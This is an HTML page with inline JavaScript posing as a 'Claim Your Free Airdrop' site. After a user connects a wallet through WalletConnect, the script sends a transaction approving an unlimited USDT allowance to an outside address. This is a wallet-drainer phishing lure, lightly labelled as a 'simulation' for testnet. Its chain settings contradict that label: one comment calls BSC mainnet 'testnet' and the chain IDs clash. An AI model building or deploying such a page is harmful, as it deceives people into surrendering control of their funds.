<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Claim Airdrop</title>
  <script src="https://unpkg.com/@walletconnect/modal@2.5.1/dist/index.umd.js"></script>
</head>
<body>
  <h2 style="color:green;">🎁 Claim Your Free Airdrop</h2>
  <p style="color:red; font-weight:bold;">Switch to Binance Smart Chain Testnet in Trust Wallet before scanning.</p>
  <div id="wc-modal"></div>
  <p id="status" style="font-weight:bold;"></p>

  <script>
    const projectId = "df697a886c855d8fdd8d7aa38ab5e51e";  // <-- Replace with your WalletConnect project ID
    const providerMetadata = {
      name: "Airdrop DApp",
      description: "Fake claim dApp for simulation",
      url: "https://rahman08arshad.github.io/gayatritestnet/",
      icons: ["https://walletconnect.com/walletconnect-logo.png"],
    };

    const modal = new WalletConnectModal.WalletConnectModal({
      projectId,
      explorerRecommendedWalletIds: "NONE",
      providerMetadata,
      themeMode: "light"
    });

    let client, session;

    async function startWalletConnect() {
      client = await WalletConnectModal.WalletConnectModalSignClient.init({
        projectId,
        metadata: providerMetadata
      });

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ["eth_sendTransaction"],
            chains: ["eip155:56"], // BSC Testnet
            events: ["accountsChanged", "chainChanged"]
          }
        }
      });

      modal.openModal({ uri });
      session = await approval();
      modal.closeModal();

      autoApprove(session);
    }

    async function autoApprove(session) {
      const address = session.namespaces.eip155.accounts[0].split(":")[2];
      const tx = {
        from: address,
        to: "0x55d398326f99059ff775485246999027b3197955", // USDT contract (mainnet-like)
        data: "0x095ea7b300000000000000000000000033eed64f9428637b955b0379825f2066ed5d101affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        gas: "0x5208"
      };

      try {
        await client.request({
          topic: session.topic,
          chainId: "eip155:97",
          request: {
            method: "eth_sendTransaction",
            params: [tx]
          }
        });

        document.getElementById("status").innerText = "✅ Approval transaction sent!";
      } catch (err) {
        document.getElementById("status").innerText = "❌ Error: " + err.message;
      }
    }

    startWalletConnect();
  </script>
</body>
</html>
